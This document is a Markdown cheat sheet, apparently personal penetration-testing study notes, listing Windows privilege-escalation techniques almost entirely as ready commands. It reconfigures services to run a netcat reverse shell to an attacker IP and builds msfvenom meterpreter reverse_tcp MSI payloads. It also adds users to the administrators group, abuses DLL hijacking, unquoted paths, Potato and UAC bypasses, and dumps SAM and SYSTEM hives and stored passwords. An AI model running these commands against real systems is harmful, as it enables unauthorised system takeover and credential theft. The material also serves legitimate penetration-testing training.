---
title: Windows Privilege Escalation
---

## Windows Privilege Escalation

https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html
https://github.com/areyou1or0/Windows
https://git.io/JL7sx
https://github.com/C0nd4/OSCP-Priv-Esc
https://sushant747.gitbooks.io/total-oscp-guide/content/windows.html
https://www.microsoftpressstore.com/articles/article.aspx?p=2224373&seqNum=2
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls
https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html
https://atom.hackstreetboys.ph/windows-privilege-escalation-service-exploits/

### Tools

`powershell.exe -ex bypass -c Import-Module .\powerup.ps1; Invoke-AllChecks`

`winPEAS.exe cmd fast`

---

### Weak Service Permissions

_It is very often in Windows environments to discover services that run with SYSTEM privileges and they don’t have the appropriate permissions set by the administrator. This means that either the user has permissions over the service or over the folder of where the binary of the service is stored or even worse both._

- Upload _accesschk.exe_ to a writable directory first. For XP SP0, version 5.2 of _accesschk.exe_ is needed.
- You can execute the command as follows to list potentially vulnerable services. This will show list each service and the groups which have write permissions to that service. if you have an account in any of these groups then you’ve potentially got privilege escalation.

```pwsh
accesschk.exe -uwcqv * -accepteula
```

- You could instead supply a group/user and it will limit output to services that group/user has write permission to.

```pwsh
accesschk.exe "Users" -uwcqv * -accepteula
accesschk.exe "NT AUTHORITY\INTERACTIVE" -uwcqv * -accepteula
accesschk.exe "Everyone" -uwcqv * -accepteula
```

- The output will be the service name, the group name and the permissions that group has. Anything like _SERVICE_CHANGE_CONFIG_ or _SERVICE_ALL_ACCESS_ is a win.
- The next step is to determine the status of this service and the binary path name.

```pwsh
sc qc "Service Name"
```

- Case-a) Add the user to the admin group.

```pwsh
sc config "Service Name" binPath="net localgroup administrators <username> /add"
```

- Case-b) Upload nc.exe to writable directory and change the config of service

```pwsh
sc config "Service Name" binpath= "C:\Inetpub\nc.exe -nv <attackerip> <attacker port> -e C:\WINDOWS\System32\cmd.exe"
sc config "Service Name" obj= ".\LocalSystem" password= ""
```

- Restart Service

```pwsh
sc stop "Service Name"
sc start "Service Name"
```

---

### Executable file

Here we are looking for executable files associace with a service that we can overwrite.

- Find the files where we have write permission

```pwsh
accesschk.exe -wusv "user" "C:\Program Files" | findstr /E /C:".exe"
```

- Find out the service name

```pwsh
wmic service name,pathname | findstr <name_service.exe>
```

- Generate a malicios exe file and dopr it in the target directory

---

### Schedule Task

_Here we are looking for tasks that are run by a privileged user, and run a binary that we can overwrite._

- List all the tasks

```pwsh
schtasks /query /fo LIST /v
```

- Copy-paste the text and past it into file on Kali _schtask.txt_
- Search the task with privilege. You can change the name SYSTEM to another privileged user.

```pwsh
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
```

- Launching a Scheduled Task manually using _schtasks_.

```pwsh
schtasks /RUN /TN "Task Name"
```

---

### Insecure Service Registry Permissions

- Find writable registry keys for services using Accesschk.

```pwsh
accesschk.exe "NT AUTHORITY\INTERACTIVE" -kvuqsw hklm\System\CurrentControlSet\services -accepteula
accesschk64.exe "BUILTIN\Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula
accesschk64.exe "Everyone" -kqswvu hklm\System\CurrentControlSet\services -accepteula
```

- Hunt the kyes with Linux

```pwsh
Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List | Out-File -FilePath C:\temp\service_keys.txt
```

On Linux run

```bash
cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERACTIVE\|Authenticated Users" | grep -v "ReadKey" | grep -B 1 -i "Authenticated Users|\BUILTIN\\\Users\|Everyone\|INTERACTIVE\|FullControl\|Modify\|Write"
```

- Check query value.

```pwsh
reg query HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath
```

- Change image path.

```pwsh
reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d "C:\temp\evil.exe"
```

```pwsh
Set-ItemProperty -Path "hklm:\System\CurrentControlSet\services\SomeSoftwareName" -Name "ImagePath" -Value "C:\temp\evil.exe"
```

- Restart the service and the custom payload will be executed instead of the service binary and it will return back a shell as SYSTEM.

```pwsh
sc start "SomeSoftwareName"
```

---

### DLL Hijacking

In Windows environments when an application or a service is starting it looks for a number of DLL’s in order to function properly. If these DLL’s doesn’t exist or are implemented in an insecure way (DLL’s are called without using a fully qualified path) then it is possible to escalate privileges by forcing the application to load and execute a malicious DLL file.

- Find missing DLL

```pwsh
powershell.exe -ep bypass -c Import-Module .\powerup.ps1; Find-PathDLLHijack
```

- Check if you have frite permission in the directory

```pwsh
icacls <path dll>
```

- Compile a malicios dll with msfvenom and move it into the vulnerable directory.
- Restart the process

---

### AlwaysInstallElevated

_AlwaysInstallElevated is functionality that offers all users (especially the low privileged user) on a windows machine to run any MSI file with elevated privileges._

- Check if these 2 registry value is 1.

```pwsh
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- If yes, create malicious file.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi-nouac -o evil.msi

msfvenom -p windows/exec CMD='net localgroup administrators <user> /add' -f msi-nouac -o setup.msi
```

- Execute your file on victim.

```pwsh
msiexec /quiet /qn /i C:\evil.msi
```

---

### Unquoted paths

_If we find a service running as SYSTEM/Administrator with an unquoted path and spaces in the path we can hijack the path and use it to elevate privileges_

- For example, the following path would be vulnerable:

```pwsh
C:\Program Files\canon\IJ Scan Utility\SETEVENT.exe
```

- We could place our payload with any of the following paths:\*

```pwsh
C:\Program.exe
C:\Program Files\canon\IJ.exe
```

- The following command will display affected services:

```pwsh
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
```

---

### Hot Potato

_NBNS spoofing + NTLM relay + implementation of a fake WPAD proxy server which is running locally on the target host_

- Command to add user to admin group:

```pwsh
powershell.exe -ep bypass -c Import-Module ./Tater.ps1; Invoke-Tater -Trigger 1 -Command "net localgroup administrators <user name> /add"
```

---

### Jucy Potato

_When you have SeImpersonate or SeAssignPrimaryToken privileges_

```pwsh
juicypotato.exe -l 1337 -p c:\user\tmp\shell.exe -t *
```

---

```pwsh
tanter.exe <user name>
```

---

### UAC Bypass

```pwsh
akagi32 <Key> <executable file>
```

```pwsh
akagi32 10 c:\windows\system32\reverse_shell.exe
```

---

### Saved session information (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)

```pwsh
powershell.exe -ep bypass -c Import-Module SessionGopher.ps1; Invoke-SessionGopher -Thorough
```

```pwsh
SessionGopher.exe
```

---

### Exploit user privileges

https://github.com/gtworek/Priv2Admin

---

### ClearText passwords

- Find all passwords in all files

```pwsh
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /spin "password" *.*
```

- Credentials in cmdkey

```pwsh
cmdkey /list
```

- Find passwords in event log files.

```pwsh
C:\Windows\System32\Config\*.evt
```

```pwsh
C:\Windows\System32\winevt\Logs\*.evtx
```

```
Get-WinEvent -path file.evtx
```

- SAM and SYTEM file

```pwsh
reg save HKLM\SAM C:\sam
reg save HKLM\SYSTEM C:\system

C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\SAM
C:\Windows\repair\system
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\RegBack\system
```

- These are common files to find them in. They might be base64-encoded. So look out for that

```pwsh
type c:\sysprep.inf
type c:\sysprep\sysprep.xml
type c:\unattend.xml
type %WINDIR%\Panther\Unattend\Unattended.xml
type %WINDIR%\Panther\Unattended.xml
```

- In Registry

```pwsh
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

### Escalate to SYSTEM from Administrator

```pwsh
psexec -i -s cmd.exe /accepteula
```

### Kernel exploit

- python windows exploit suggester using systeminfo output

```bash
python windows-exploit-suggester.py --upadte
python windows-exploit-suggester.py --systeminfo <filename>
```

- Already compiled exploit

```pwsh
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits
```

---
